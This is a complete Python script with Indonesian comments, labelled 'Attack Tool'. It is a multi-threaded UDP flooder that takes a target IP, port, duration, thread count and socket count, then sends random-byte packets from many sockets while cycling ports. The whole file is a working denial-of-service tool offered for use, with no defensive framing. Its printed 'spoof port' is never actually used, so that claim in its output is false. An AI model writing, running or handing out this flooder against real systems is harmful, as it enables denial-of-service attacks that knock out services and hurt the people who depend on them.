import os
import time
import socket
import random
import threading
from datetime import datetime

# Informasi waktu
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Fungsi serangan dengan banyak socket
def attack(ip, port, duration, socket_count):
    timeout = time.time() + duration
    sent = 0
    sockets = []

    # Membuat banyak socket
    for _ in range(socket_count):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sockets.append(sock)

    print(f"[INFO] Starting attack on {ip}:{port} for {duration} seconds with {socket_count} sockets.")
    while time.time() < timeout:
        for sock in sockets:
            try:
                # Spoof port random untuk setiap paket
                spoof_port = random.randint(1, 65535)
                bytes = random._urandom(random.randint(1024, 2048))  # Variasi ukuran paket
                sock.sendto(bytes, (ip, port))
                sent += 1
                port = port + 1 if port < 65534 else 1
                print(f"Sent {sent} packets to {ip} via port {spoof_port}")
            except Exception as e:
                print(f"[ERROR] {e}")
                continue

# Fungsi serangan multi-threaded
def threaded_attack(ip, port, duration, threads, socket_count):
    attack_threads = []

    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(ip, port, duration, socket_count))
        attack_threads.append(thread)
        thread.start()

    for thread in attack_threads:
        thread.join()

# Menu utama
os.system("clear")
os.system("figlet Attack Tool")
print("\nAuthor   : Mr.Rius")
print("Github   : https://github.com/rius-admin\n")
print("Ctrl + C = stop\n")

# Input pengguna
try:
    ip = input("Target IP                : ")
    port = int(input("Target Port              : "))
    duration = int(input("Attack Duration (seconds): "))
    threads = int(input("Number of Threads        : "))
    socket_count = int(input("Number of Sockets        : "))

    print("\n[INFO] Preparing attack...\n")
    time.sleep(3)
    os.system("clear")
    os.system("figlet Attack!")
    print("[====================] Starting attack...\n")
    time.sleep(1)

    # Mulai serangan
    threaded_attack(ip, port, duration, threads, socket_count)
    print("\n[INFO] Attack completed!")

except KeyboardInterrupt:
    print("\n[WARNING] Attack stopped by user.")
except ValueError:
    print("\n[ERROR] Invalid input. Please enter numeric values.")

print("\n[INFO] Program ended.")
